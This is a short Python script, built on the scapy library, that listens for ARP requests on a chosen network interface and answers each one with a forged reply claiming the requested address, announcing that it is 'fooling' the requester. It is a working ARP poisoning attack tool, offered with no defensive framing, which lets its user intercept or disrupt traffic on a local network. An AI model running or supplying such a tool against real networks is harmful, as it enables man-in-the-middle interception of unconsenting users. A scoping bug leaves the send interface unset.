import sys
from scapy.all import sniff, sendp, ARP, Ether


IFACE = ""

def arp_poison_callback(packet):
    # Is ARP Request?
    if packet[ARP].op == 1:
        answer = Ether(dst=packet[ARP].hwsrc) / ARP()
        answer[ARP].op = "is-at"
        answer[ARP].hwdst = packet[ARP].hwsrc
        answer[ARP].psrc = packet[ARP].pdst
        answer[ARP].pdst = packet[ARP].psrc
        print(f"Fooling {packet[ARP].psrc} that {packet[ARP].pdst} is me.")
        sendp(answer, iface=IFACE)


def main():
    IFACE = input("Please enter an interface to sniff traffic on: ")
    try:
        sniff(prn=arp_poison_callback, filter="arp", iface=IFACE, store=0)
    except Exception as e:
        print(f"Error attempting to conduct attack: {e}")
    

if __name__ == "__main__":
    main()